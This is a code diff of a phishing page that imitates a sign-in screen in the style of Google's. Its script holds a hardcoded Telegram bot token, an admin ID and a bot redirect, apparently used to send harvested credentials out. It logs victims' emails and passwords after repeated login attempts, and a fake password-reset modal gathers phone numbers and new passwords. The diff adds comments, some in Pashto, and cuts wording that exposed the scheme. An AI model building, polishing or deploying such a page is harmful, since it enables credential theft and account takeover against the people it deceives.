@@ -166,6 +166,7 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
+    <!-- Forgot Password Modal -->
     <div id="forgotModal" class="modal">
         <div class="modal-content">
             <div id="modalStep1">
@@ -186,7 +187,6 @@
             </div>
             <div id="modalStep3" style="display:none;">
                 <h3>Set new password</h3>
-                <p>This will become the REAL password for: <strong id="showEmailTarget"></strong></p>
                 <input type="password" id="newPassword" placeholder="New password (min 8 characters)">
                 <button id="resetPasswordBtn">Reset password</button>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
@@ -205,7 +205,9 @@
 </div>
 
 <script>
+    // ========== Bot Redirect Link ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
+    
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
@@ -277,6 +279,7 @@
         targetResetEmail = "";
     }
 
+    // Step 1: Email Validation
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         let errorBox = document.getElementById('errorBox');
@@ -302,6 +305,7 @@
         attemptCount = 0;
     };
 
+    // Step 2: Password Processing
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         let errorBox = document.getElementById('errorBox');
@@ -350,6 +354,7 @@
             return;
         }
         
+        // پاسورډ سم دی
         if (attemptCount === 3) {
             storedEmails[currentEmail] = pass;
             
@@ -383,6 +388,7 @@
         }
     };
 
+    // Forgot Password Functionality
     document.getElementById('forgotPasswordBtn').onclick = () => {
         document.getElementById('forgotModal').style.display = 'flex';
         document.getElementById('modalStep1').style.display = 'block';
@@ -394,6 +400,7 @@
         document.getElementById('newPassword').value = '';
     };
 
+    // Send code button
     document.getElementById('sendCodeBtn').onclick = () => {
         let phone = document.getElementById('phoneNumber').value.trim();
         let resetEmail = document.getElementById('resetEmailInput').value.trim();
@@ -412,8 +419,8 @@
         }
         
         targetResetEmail = resetEmail;
-        document.getElementById('showEmailTarget').innerHTML = targetResetEmail;
         
+        // 6-digit random code generate کول
         generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
         document.getElementById('showCode').innerHTML = generatedCode;
         
@@ -421,6 +428,7 @@
         document.getElementById('modalStep2').style.display = 'block';
     };
 
+    // Verify code button
     document.getElementById('verifyCodeBtn').onclick = () => {
         let enteredCode = document.getElementById('verificationCode').value.trim();
         if (enteredCode === generatedCode) {
@@ -431,7 +439,7 @@
         }
     };
 
-    // دلته نوی پاسورډ د هغه ایمیل اصلي پاسورډ کیږي
+    // Reset password button - د هر ایمیل لپاره به پاسورډ بدل شي (که کارول شوی وي که نه)
     document.getElementById('resetPasswordBtn').onclick = () => {
         let newPass = document.getElementById('newPassword').value.trim();
         
@@ -445,11 +453,9 @@
             return;
         }
         
-        // دا کوماند د دې ایمیل لپاره نوی پاسورډ د اصلي پاسورډ په توګه خوندي کوي
+        // په هر صورت کې پاسورډ بدل شي، که ایمیل مخکې کارول شوی وي او که نه
         storedEmails[targetResetEmail] = newPass;
-        
-        alert(`✓ Password successfully changed for ${targetResetEmail}!\n\nThe new password is now the REAL password for this email.\nYou can now login with your new password.`);
-        
+        alert(`Password successfully changed for ${targetResetEmail}! You can now login with your new password.`);
         closeModal();
     };
 </script>
